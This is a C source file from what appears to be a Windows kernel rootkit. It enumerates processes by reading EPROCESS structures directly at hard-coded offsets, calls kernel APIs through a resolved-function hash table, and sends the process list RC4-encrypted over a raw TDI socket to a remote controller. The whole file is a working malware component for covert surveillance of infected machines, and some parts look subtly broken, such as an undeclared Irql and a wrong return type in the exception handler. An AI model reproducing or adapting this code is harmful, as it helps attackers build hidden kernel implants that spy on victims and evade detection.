#include "common.h"

/*///////////////////////////////////////////////////////
//
//	File: ps.c
//
//	Gather process information
//	directly from EPROCESS structure
//
//	1) Get total number of processes and store them in
//	a double linked list
//	2) Copy list to previously allocated buffer for
//	data extraction
//	3) Send buffer to user-space
*/////////////////////////////////////////////////////////


PROOTKIT_PROCESS_LIST_HEAD kernel_get_processes(IN PROOTKIT_API_HASH Hash)
{
	NTSTATUS st;
	ULONG bytes = 0;
	CLIENT_ID cid = { 0 };
	OBJECT_ATTRIBUTES oa = { 0 };
	UNICODE_STRING function = { 0 };
	PSYSTEM_PROCESS_INFORMATION sysinfo = NULL;
	PVOID buffer = NULL;
	HANDLE handle;
	PEPROCESS Eprocess = NULL;
	PROOTKIT_PROCESS_ENTRY entrybuffer = NULL;
	TIME_FIELDS timer = { 0 };
	LARGE_INTEGER time = { 0 };
	CHAR timebuffer[260] = { 0 };
	ULONG i;

	g_process_head = (PROOTKIT_PROCESS_LIST_HEAD)Hash->_ExAllocatePool(NonPagedPool, sizeof(ROOTKIT_PROCESS_LIST_HEAD));
	InitializeListHead(&g_process_head->Entry);
	g_process_head->NumberOfProcesses = 0;

	__try
	{
		for (i = 0; i < PAGE_SIZE; i += 4)
		{
			st = Hash->_PsLookupProcessByProcessId((HANDLE)i, &Eprocess);
			if (NT_SUCCESS(st))
			{
				entrybuffer = (PROOTKIT_PROCESS_ENTRY)Hash->_ExAllocatePool(NonPagedPool, sizeof(ROOTKIT_PROCESS_ENTRY));
				memset(entrybuffer, 0, sizeof(ROOTKIT_PROCESS_ENTRY));

				entrybuffer->Eprocess = (ULONG_PTR)Eprocess;
				kistrcpy(entrybuffer->ImageFileName, (CHAR*)(ULONG_PTR)Eprocess + g_rootkit_dynamic_data.ImageFileName_Offset);
				entrybuffer->pid = *(PUINT32)((ULONG_PTR)Eprocess + g_rootkit_dynamic_data.UniqueProcessId_Offset);
				entrybuffer->ppid = *(PUINT32)((ULONG_PTR)Eprocess + g_rootkit_dynamic_data.InheritedFromUniqueProcessId_Offset);
				entrybuffer->IsProcessProtected = (BOOLEAN)Hash->_PsIsProtectedProcess(Eprocess);

				time = *(LARGE_INTEGER*)((ULONG_PTR)Eprocess + g_rootkit_dynamic_data.CreateTime_Offset);
				Hash->_RtlTimeToTimeFields(&time, &timer);
				Hash->_sprintf_s(entrybuffer->ProcessCreationTime, 260, "%02u/%02u/%04u %02u:%02u:%02u:%03u",
					timer.Day, timer.Month, timer.Year, timer.Hour, timer.Minute, timer.Second,
					timer.Milliseconds);
					
				
				Hash->_KfAcquireSpinLock(&g_globalspinlock);
				InsertTailList(&g_process_head->Entry, &entrybuffer->Entry);
				Hash->_KfReleaseSpinLock(&g_globalspinlock, Irql);

				g_process_head->NumberOfProcesses++;

				Hash->_ObfDereferenceObject(Eprocess);


			}
		}


	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		KdPrint(("\r\nException Caught in Process List"));
		return GetExceptionCode();
	}

	return g_process_head;
}


ULONG rk_copy_process_list_to_buffer(IN PROOTKIT_PROCESS_ENTRY Buffer, IN PROOTKIT_API_HASH Hash)
{
	PROOTKIT_PROCESS_ENTRY Process = NULL;
	ULONG returnedbytes = 0;

	if (g_process_head == NULL)
		return 0;

	Hash->_KfAcquireSpinLock(&g_globalspinlock);

	while (!IsListEmpty(&g_process_head->Entry))
	{
		Process = (PROOTKIT_PROCESS_ENTRY)RemoveTailList(&g_process_head->Entry);
		kimemcpy(Buffer, Process, sizeof(ROOTKIT_PROCESS_ENTRY));
		Hash->_ExFreePoolWithTag(Process,0);
		Buffer++;
		returnedbytes++;
	}

	Hash->_KfReleaseSpinLock(&g_globalspinlock, Irql);

	Hash->_ExFreePoolWithTag(g_process_head,0);
	g_process_head = NULL;
	return returnedbytes * sizeof(ROOTKIT_PROCESS_ENTRY);
}

BOOLEAN rk_send_process_to_userspace(IN PFILE_OBJECT SocketObject, IN PROOTKIT_API_HASH Hash)
{
	ULONG bytes = 0;
	ULONG returnedbytes = 0;
	INT sendsize = 0;
	PROOTKIT_PROCESS_LIST_HEAD processhead = NULL;
	PROOTKIT_PROCESS_ENTRY entrybuffer = NULL;
	PROOTKIT_PROCESS_ENTRY cryptedbuffer = NULL;
	PVOID Buffer = NULL;
	PMDL Mdl = NULL;
	BOOLEAN g_cond = FALSE;
	rc4_ctx ctx = { 0 };

	processhead = kernel_get_processes(Hash);
	bytes = processhead->NumberOfProcesses*sizeof(ROOTKIT_PROCESS_ENTRY);

	do
	{
		sendsize = send(SocketObject, (char*)&bytes, sizeof(ULONG));
		if (sendsize > 0)
		{
			Buffer = KiAllocateMappedVirtualMemory(bytes, 'kbot', &Mdl, Hash);
			if (Buffer && Hash->_MmIsAddressValid(Buffer) && KiIsMdlAdddressValid(Mdl, Hash) == TRUE)
			{
				entrybuffer = (PROOTKIT_PROCESS_ENTRY)Buffer;
				if (entrybuffer && Hash->_MmIsAddressValid(entrybuffer))
				{
					returnedbytes = rk_copy_process_list_to_buffer(entrybuffer, Hash);
					if (returnedbytes > 0)
					{
						sendsize = tdi_send_crypted(SocketObject, RC4_KEY_2, (PROOTKIT_PROCESS_ENTRY)entrybuffer, returnedbytes, 0);
						if (sendsize > 0)
						{
							g_cond = TRUE;
							goto clean;
						}
					}
				}
			}
		}


	} while (FALSE);

clean:

	KiFreeMappedVirtualMemory(Buffer, 'kbot', Mdl, Hash);
	Buffer = NULL;

	return g_cond;
}

